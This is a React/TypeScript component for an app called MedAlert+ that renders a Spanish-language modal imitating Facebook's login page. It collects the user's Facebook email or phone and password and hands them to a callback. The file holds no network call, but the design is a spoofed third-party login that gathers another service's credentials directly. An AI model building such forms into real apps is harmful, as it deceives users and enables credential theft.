import React, { useState } from 'react';
import { Card } from '../ui/card';
import { Button } from '../ui/button';
import { Input } from '../ui/input';
import { Eye, EyeOff } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

interface FacebookLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onContinue: (email: string, password: string) => void;
}

export function FacebookLoginModal({ isOpen, onClose, onContinue }: FacebookLoginModalProps) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleContinue = () => {
    if (email.trim() && password.trim()) {
      onContinue(email, password);
      setEmail('');
      setPassword('');
    }
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          {/* Backdrop */}
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50"
            onClick={onClose}
          />

          {/* Modal */}
          <motion.div
            initial={{ opacity: 0, scale: 0.9, y: 20 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.9, y: 20 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4"
          >
            <Card className="w-full max-w-sm bg-white shadow-2xl p-6 space-y-5">
              {/* Facebook Logo and Title */}
              <div className="flex flex-col items-center gap-3 pb-2">
                <div className="w-14 h-14 bg-[#1877F2] rounded-full flex items-center justify-center">
                  <svg className="w-8 h-8" viewBox="0 0 24 24" fill="white">
                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                  </svg>
                </div>
                <div className="text-center">
                  <h2 className="text-[#1877F2]">Iniciar Sesión en Facebook</h2>
                  <p className="text-sm text-slate-500">para continuar con MedAlert+</p>
                </div>
              </div>

              {/* Back Link */}
              <button 
                onClick={onClose}
                className="text-xs text-[#1877F2] hover:underline"
              >
                ← Volver a las cuentas
              </button>

              {/* Email/Phone Input */}
              <div className="space-y-2">
                <Input
                  type="text"
                  placeholder="Correo electrónico o número de teléfono"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full text-sm"
                />
              </div>

              {/* Password Input */}
              <div className="space-y-2">
                <div className="relative">
                  <Input
                    type={showPassword ? "text" : "password"}
                    placeholder="Contraseña de Facebook"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full pr-10 text-sm"
                    onKeyPress={(e) => {
                      if (e.key === 'Enter') {
                        handleContinue();
                      }
                    }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600"
                  >
                    {showPassword ? (
                      <EyeOff className="w-4 h-4" />
                    ) : (
                      <Eye className="w-4 h-4" />
                    )}
                  </button>
                </div>
              </div>

              {/* Action Button */}
              <Button
                onClick={handleContinue}
                disabled={!email.trim() || !password.trim()}
                className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white py-2.5"
              >
                Iniciar sesión
              </Button>

              {/* Forgot Password Link */}
              <div className="text-center">
                <button className="text-sm text-[#1877F2] hover:underline">
                  ¿Olvidaste tu contraseña?
                </button>
              </div>

              {/* Divider */}
              <div className="relative">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-slate-200"></div>
                </div>
                <div className="relative flex justify-center text-xs">
                  <span className="bg-white px-2 text-slate-500">o</span>
                </div>
              </div>

              {/* Create Account Button */}
              <Button
                variant="outline"
                onClick={onClose}
                className="w-full bg-[#42B72A] hover:bg-[#36A420] text-white border-0 py-2.5"
              >
                Crear cuenta nueva
              </Button>

              {/* Info Text */}
              <p className="text-xs text-slate-500 text-center leading-relaxed pt-2">
                Al continuar, MedAlert+ recibirá acceso continuo a la información que compartas y Facebook usará la información de acuerdo con su política de privacidad.
              </p>
            </Card>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
}
